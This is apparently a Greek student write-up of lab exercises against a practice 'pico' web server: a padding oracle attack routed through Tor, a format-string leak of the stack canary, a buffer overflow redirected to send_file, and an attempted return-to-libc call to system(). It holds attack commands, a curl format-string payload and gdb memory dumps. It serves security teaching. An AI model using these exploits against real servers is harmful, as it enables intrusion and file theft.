
## Ερώτημα 4

Το pattern όπου ο χρήστης δίνει ένα AES cipher text και ο server του απαντάει εάν το cipher text είναι έγκυρο ή μη έγκυρο, τότε το pattern αυτό είναι ευπαθές και ονομάζεται Padding Oracle Attack στην βιβλιογραφία.

Με την τροποποίηση ενός python script από το github έτσι ώστε τα ερωτήματα να περνάνε μέσα απο το tor, καταλήξαμε να πάρουμε τα αποτελέσματα του cipher text τα οποία ήταν το FLAG "/secet/x".


> Σημείωση: Για κάποιο λόγο όταν τρέχουμε το python script μέσα από ένα bash script, σταματάει η εκτέλεση μετά απο ένα σημείο. Ο μόνος τρόπος για να εκτελεστεί επιτυχώς το script μας είναι να τρέξει ο χρήστης χειροκίνητα όπως παρακάτω (αφού πρώτα έχει εκτελεστεί το run.sh το οποίο θα εγκαταστήσει τα python requirements):

```bash
source four/venv/activate
four/venv/bin/python3 four/exploit4local.py -c 4f9886291b512f70611cde3188cdbc1b51d17da5ac4f8ea7af3ab8f10543f09e -l 16 --host localhost:8000 -u /check_secret.html?id= -v --error "invalid padding" --post 'secret=' --method POST

```

Αντίστοιχα για το tor:

```bash

source four/venv/activate
four/venv/bin/python3 four/exploit4tor.py -c ad8bb176da1f40a98385ad0ae9777c3208b78ae57a7fec84092b2cbbaf2ab1c0  -l 16  --host localhost:8000 -u /check_secret.html?id= -v --error "invalid padding" --post 'secret=' --method POST
```




## Ερώτημα 5

#### Βήμα 0: Εντοπισμός και Κατανόηση στόχου

Παρατηρώντας την συνάρτηση post_param(), παρατηρούμε ότι υπάρχει η δυνατότητα buffer overflow στο buffer post_data, διότι η μεταβλητή payload_size μπορεί να τροποιηθεί απο το header με 'Content-Length: 0' σε μέγεθος 0. Με αυτόν τον τρόπο θα μπορούμε να γράψουμε πάνω στο return address της post_param().

Πριν ξεκινήσουμε την επίθεση, παρατηρούμε απο το Makefile του pico ότι δεν υπάρχει η παράμετρος που απενεργοποιεί το stack execution. Επίσης είναι ενεργοποιημένοι οι stack protectors όπως το canary το οποίο θα πρέπει να το μάθουμε προκειμένου να εκτελέσουμε την επίθεση. Για να διαεπεράσουμε το απενεργοποιημένο stack execution θα μπορούσαμε να δ]γράψουμε στο return address, τη διεύθυνση ενός function call το οποίο βρίσκεται στο code segment. Δεδομένου ότι έχουμε σαν στόχο να αποκτήσουμε πρόσβαση στο αρχείο **/secet/x** επιλέξαμε την κλήση της **send_file()** η οποία πραγματοποιείται στο σώμα της συνάρτησης serve_index().

Για να εκτλέσουμε την επίθεση, θα πρέπει να γνωρίζουμε:

* canary
* post_data buffer address
* call send_file assembly instruction address 

#### Βήμα 1: Βρίσκουμε το canary μέσω gdb στο local pico build

Στο local pico: Με χρήση gdb βρίσκουμε το canary και προσπαθούμε να φτάσουμε σε

gdb στο ./server

Για να ακολουθεί τα παιδιά ο gdb ενεργοποιούμε child follow fork mode με την εκτέλεση της εντολής: 

`set follow-fork-mode child`


Αφου βάλουμε breakpoint στην check_auth(), παρατηρώντας την assebly της check_auth( βλέπουμε την τριπλέτα εντολών που χαρακτηρίζουν το canary κατα το function call μιας συνάρτησης.

```
mov %gs:0x14,%eax
mov %eax, -0xc(%ebp)
xor %eax,%eax
```


Με βάση τον %ebp βρίσκουμε τη διεύθυνση του canary.

```

(gdb) p $ebp
$2 = (void *) 0xffffd698
(gdb) p $ebp - 12
$3 = (void *) 0xffffd68c
(gdb) x/4bx 0xffffd68c
0xffffd68c:     0x00    0x87    0xe0    0xd8
(gdb) 
```


Άρα το canary είναι το `0x00    0x87    0xe0    0xd8`

> Το γεγονός ότι το canary που βρήκαμε τελειώνει σε 00, αυξάνει τις πιθανότητες να έχουμε βρει το σωστό canary, διότι ένα έγκυρο canary τελειώνει σε 00.


#### Βήμα 2: Προσπαθούμε να φτάσουμε στο canary μέσω της vulnerble printf στο local pico build


Διαβάζοντας το pdf [1] καταλαβαίνουμε ότι εάν βάζουμε %x στην printf() χωρίς να υπάρχουν ανίστοιχα ορίσματα που να αντιστοιχούν στα %x, τότε η printf() θα εκτυπώνει τα περιεχόμενα που υπάρχουν ακριβώς πριν τη διεύθυνση του πρώτου ορίσματος της printf() που ειναι το Address Format String.

Για να πάρουμε τις διευθύνσεις πίσω απο την κλήση της printf, βάζουμε %x μέχρι να φτάσουμε στο canary που βρήκαμε στο προηγούμενο βήμα.
Με τη σωστή σειρά: `d8e08700`

```bash
curl -X POST \
    http://localhost:8000/check_secret.html  \
    -i \
    --user "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x :"
```

Αποτέλεσμα:
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Invalid user: 5790b310 0000009b 56561511 f7c18d80 00000000 578fb376 56564180 f7c18d80 00000000 5790b310 0000009c 00000000 00000001 5790b310 5790b3ab 5790b3ac 0000009b ffe5b268 f7ab0ff2 f7c18d80 00000000 00000000 00000000 f7ab0fd7 f7c16880 f7c18d80 d8e08700 f7c18d80 56563f04 ffe5b278 565610c2 "



#### Βήμα 3: Εύρεση διεύθυνσης του post_data buffer

O saved ebp, δηλαδή το περιεχόμενο του ebp της συνάρτησης check_auth

θα έχει σταθερή απόσταση από το post_data buffer address. Αυτό ισχύει διότι
ο saved ebp της check_auth() και ο saved_ebp της post_param() είναι ο ίδιος,
αφού καλούνται απο την ίδια συνάρτηση.

Άρα  [saved_ebp] - [post_data buffer address] = Σταθερά

Αφού βρούμε τον saved_ebp και τη διεύθυνση του post_data buffer βρίσκουμε απόσταση **136**

Άρα βρήκαμε τη διεύθυνση του buffer στο τοπικό pico και άρα ισχύει ότι:

[saved_ebp] - 136 = [post_data buffer address] 

Για να βρούμε τη διεύθυνση του post_data buffer στο target pico, πρέπει πρώτα να βρούμε τον saved_ebp μέσω της vulnerable printf(). Τότε αρκεί να αφαιρέσουμε αυτόν τον αριθμό με το 136 και έτσι έχουμε τη διεύθυνση του post_data buffer.



#### Βήμα 4: Εύρεση διεύθυνσης του call send_file assembly instruction

Δεδομένου ότι το code segment είναι συνεχόμενο και δεν αλλάζει κατα την εκτέλεση του προγράμματος, μας αρκεί να βρούμε τη διεύθυνση μιας εντολής (την οποία θα γνωρίζουμε και στο target pico), τη διεύθυνση του call send_file (την οποία μπορύμε να βρούμε μέσω gdb) και να υπολογίσουμε την απόσταση μεταξύ αυτών των δύο εντολών. Αυτό εξασφαλίζει ότι η απόσταση αυτή των δύο συγκεκριμένων assembly εντολών, θα είναι ίδια και για το target pico για τον λόγο που αναφέραμε παραπάνω.

Η διεύθυνση μίας εντολής στην οποία μπορούμε να έχουμε πρόσβαση και στο target pico είναι το return address της συνάρτησης check_auth, το οποίο μπορούμε να βρούμε μέσω της vulnerable printf (με τρόπο που έχουμε ξανα-αναφέρει παραπάνω).

Αφού το return address στο local pico, βρίσκουμε και τη διεύθυνση της send_file στο local pico build μέσω gdb με εκτέλεση (print send_file) και βρίσκουμε τη διαφορά μεταξύ αυτών των δύο διευθύνσεων. Αναφέρουμε ξανά ότι, η απόσταση μεταξύ των δύο εντολών θα είναι η ίδια για το target pico build.


Βρίσκουμε

[send_file call address] - [check_auth return address] = 2196
=>
[send_file call address] = [check_auth return address] + 2196

#### Βήμα 5: Κατασκευή payload

Αφού γνωρίζουμε:

* canary
* post_data buffer address
* call send_file assembly instruction address 


Με χρήση του gdb παρακολουθούμε την εικόνα της μνήμης πρίν και μετά την αντιγραφή του payload στο post_data buffer.

Πριν την εκτέλεση της strcpy

![memory-view-post-data](./memory-post-data-view.jpg)

Mετά την εκτέλεση της strcpy
```
(gdb) x/21xw post_data
0xffdb9a60:     0x6365732f      0x782f7465      0x3d3d3d3d      0x3d3d3d3d
0xffdb9a70:     0x3d3d3d3d      0x3d3d3d3d      0x3d3d3d3d      0x3d3d3d3d
0xffdb9a80:     0x3d3d3d3d      0x3d3d3d3d      0x3d3d3d3d      0x3d3d3d3d
0xffdb9a90:     0x3d3d3d3d      0xffdb9a60      0x3d3d3d3d      0x233c33d0
0xffdb9aa0:     0x3d3d3d3d      0x3d3d3d3d      0x3d3d3d3d      0x566081e6
0xffdb9ab0:     0xffdb9a60
```

Μετά την for loop
```
(gdb) x/21xw post_data
0xffdb9a60:     0x6365732f      0x782f7465      0x00000000      0x00000000
0xffdb9a70:     0x00000000      0x00000000      0x00000000      0x00000000
0xffdb9a80:     0x00000000      0x00000000      0xffdb9a60      0xffdb9ab4
0xffdb9a90:     0x00000000      0xffdb9a60      0x00000000      0x233c33d0
0xffdb9aa0:     0x00000000      0x00000000      0x00000000      0x566081e6
0xffdb9ab0:     0xffdb9a60
```

τότε μπορούμε να κατασκευάσουμε το payload με την παρακάτω μορφή

![memory](./five_memory.png)

Ο λόγος για τον οποίο γράψαμε το post_data buffer address μετά τα 44 "3D"
είναι διότι το πρόγραμμα κάνει χρήση του buffer αμέσως μετά την κλήση της strcpy και άρα δεν θα εμφανιστεί segmentation fault για χρήση μνήμης που δεν δικαιούται το πρόγραμμα, καθώς επίσης είναι η χρήσιμη η εκτέλεση της for loop που ακολουθεί την κλήση της strcpy, διότι θα αντικαταστήσει τα "3D" * 44 με μηδενικά το οποίο θα κάνει null terminate το string "/secet/x" που είναι και ο λόγος για τον οποίο επιλέξαμε να γράψουμε τον hex κωδικό "3D" διότι αντιστοιχεί στον ascii χαρακτήρα '='.

Αμέσως μετά το return address (κόκκινη περιοχή), γράφουμε το όρισμα της send_file, το οποίο θα είναι η διεύθυνση του string "/secet/x".

Επίσης, η for loop που εκτελείται αμέσως μετά την κλήση της strcpy(), διατρέχει όλο το αλφαριθμητικό post_data μέχρι να εμφανιστεί ο χαρακτήρας 0 (null). Για αυτό τον λόγο τοποθετήσαμε τα "00" * 4 στο τέλος του payload. Σε τοπική εκτέλεση του pico κατα τη δοκιμή του payload, όταν τύγχανε η διεύθυνση του buffer να περιέχει το "00" τότε ήταν αναμενόμενο να μην λειτουργεί το payload, καθώς θα σταμάταγε η strcpy να γράφει μέχρι το post_data_buffer address (πρώτη πράσινη περιοχή απο τα αριστερά προς τα δεξιά).

Τα αρχεία `five-target.sh` και `five-taget.py` υλοποιούν την επίθεση που αναλύσαμε παραπάνω.

Οι δοκιμές πραγματοποιήθηκαν σε ubuntu x86_64 docker container. Αξίζει να σημειωθεί ότι το offset που βρήκαμε για τη διεύθυνση του send_file instruction call διαφέρει και είναι φανερό αυτό στο αρχείο `five-local.py`

Για debugging με πολλά processes (χωρίς να επανεκκινούμε τoν pico server) κάναμε χρήση της επιλογής `set detach-on-fork off` στο gdb, και αλλάζαμε inferiors με τις εντολές `info inferiors`, `inferior 1`


## Ερώτημα 6


Διαβάζοντας το αρχείο `/secet/y`
```
Plan Z: troll humans who ask stupid questions (real fun).
I told them I need 7.5 million years to compute this XD

In the meanwhile I'm travelling through time trolling humans of the past.
Currently playing this clever dude using primitive hardware, he's good but the
next move is crushing...

1.e4 c6 2.d4 d5 3.Nc3 dxe4 4.Nxe4 Nd7 5.Ng5 Ngf6 6.Bd3 e6 7.N1f3 h6 8.Nxe6 Qe7 9.0-0 fxe6 10.Bg6+ Kd8 11.Bf4 b5 12.a4 Bb7 13.Re1 Nd5 14.Bg3 Kc8 15.axb5 cxb5 16.Qd3 Bc6 17.Bf5 exf5 18.Rxe7 Bxe7

PS. To reach me in the past use the code: FLAG={<next move><public IP of this machine>}
```

καταλάβαμε ότι οι κωδικοί αναφέρονται σε έναν αγώνα σκάκι Kasparov v. Depp Blue 1997. Με μία αναζήτηση βρήκαμε ότι η επόμενη κίνηση είναι η **c4**, άρα βρήκαμε το `<next move>` τμήμα.

Για να βρούμε το άλλο τμήμα που είναι η IP του μηχανήματος στο οποίο τρέχει ο pico server, έπρεπε να καλέσουμε την system() με όρισμα `"ip addr"` ή `"curl ifconfig.me"` ή `"ifconfig"`.

Για να το πετύχουμε αυτό, θα επιχειρήσουμε ένα return to libc attack όπου θα χρησιμοποιήσουμε σαν βάση το exploit του προηγούμενου ερωτήματος, με τη διαφορά ότι αντί να καλούμε την send_file, θα καλέσουμε αυτή τη φορά την system.

- Ένας τρόπος να καλέσουμε την system ήταν να πάρουμε τη διεύθυνση της εντολής η οποία καλέι την system() παραπάνω στον κώδικα.

- Ένας άλλος τρόπος για να καλέσουμε την system() είναι χρησιμοποιώντας της διεύθυνση της system απο τη libc.


Εμείς επιλέξαμε τον 2ο τρόπο, όπου για να βρούμε τη διεύθυνση της system αρχικά έπρεπε να βρούμε πως θα συσχετίσουμε τη διεύθυνση της system στη libc με κάποια απο τα δεδομένα της στοίβας που μας επιστρέφει η vulnerable printf(). Απο τα δεδομένα της στοίβας, επιλέξαμε το `stack[27]`, δηλαδή τη διεύθυνση που βρίσκεται αμέσως μετά το canary με κατεύθυνση προς ebp. Ο λόγος που επιλέξαμε τη συγκεκριμένη διεύθυνση, είναι διότι παρατηρήσαμε ότι βρίσκεται σε μικρή απόσταση απο τη διεύθυνση της system και άρα πολύ πιθανόν να βρίσκεται μέσα στη libc. Έτσι, αφού βρήκαμε της απόσταση, αντικαταστήσαμε τη διεύθυνση της send_file απο το προηγούμενη ερώτημα με τη διεύθυνση της system η οποία υπολογίζεται απο το `(stack[27]-offset)`. Επίσης, αμέσως μετά γράψαμε τη διεύθυνση της exit την οποία βρήκαμε με παρόμοιο τρόπο, και τέλος γράψαμε τη διεύθυνση του post_data buffer το οποίο περιέχει μία απο τις εντολές `"ip addr"` ή `"curl ifconfig.me"` ή `"ifconfig"`.

Η απόσταση που είχαμε βρει στο τοπικό pico είναι 1746336 απο την πράξη `stack[27]-system_address` και 54976 για την διεύθυνση της exit με την πράξη `system_address-exit_address`.

Παρόλο που προσπαθήσαμε να βρούμε τι δεν κάνουμε σωστά, δεν καταφέραμε να βρούμε την IP του pico server.

# References

[[1] Padding Oracle Attack](https://en.wikipedia.org/wiki/Padding_oracle_attack)

[[2] Padding Oracle Attack - Github python script used](https://github.com/mpgn/Padding-oracle-attack)

[[3] Vulnerable printf - Syracuse University material - Format_String.pdf](https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf)